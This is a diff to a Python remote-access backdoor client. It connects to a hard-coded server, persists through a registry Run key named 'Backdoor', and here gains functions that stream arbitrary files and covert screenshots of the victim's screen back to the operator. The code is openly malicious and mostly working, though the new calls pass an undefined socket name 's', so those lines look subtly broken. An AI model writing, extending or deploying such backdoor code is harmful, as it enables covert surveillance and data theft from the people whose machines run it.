@@ -11,6 +11,8 @@ import time
 import ctypes
 import sys
 import shutil
+from PIL import ImageGrab
+import tempfile
 
 ip = "172.25.191.60"
 port = 8080
@@ -22,6 +24,18 @@ def registry():
             shutil.copyfile (sys.executable, location)
             subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "'
                             + location + '"', shell=True)
+
+def transfer(s, path):
+    if os.path.exists(path):
+        f = open (path, 'rb')
+        packet = f.read (5000)
+        while len(packet) > 0:
+            s.send(packet)
+            packet = f.read(1024)
+        f.close()
+        s.send('DONE'.encode())
+    else:
+        s.send('File not found'.encode())
 
 def initiate():
     tuneConnection()
@@ -104,10 +118,23 @@ def shell(mySocket):
         elif 'grab' in command.decode():
             grab, path = command.decode().split("*")
             try:
-                letGrab(mySocket, path)
+                transfer(s, path)
             except Exception as e:
                 informToServer = "[+] Some error occured. " + str(e)
                 mySocket.send(informToServer.encode())
+
+        elif 'screencap' in command.decode():
+            # Create a temp dir to store our screenshot file
+            # Sample dirpath: C:\Users\pulama\AppData\Local\Temp\tmp8dfj57ox
+            dirpath = tempfile.mkdtemp()
+            filename = "img.jpg"
+            fullpath = os.path.join(dirpath, filename)
+
+            #grab () method takes a snapshot of the screen
+            #save () method saves the snapshot in the temp dir
+            ImageGrab.grab().save(fullpath, "JPEG")
+            transfer(s, fullpath) #transfer to the Server using our transfer function
+            shutil.rmtree(dirpath) #delete the temp directory using shutil remove tree
 
         #command format: send*<destination path>*<File Name>
         # example: send*C:\Users\John\Desktop\*photo.jpeg 
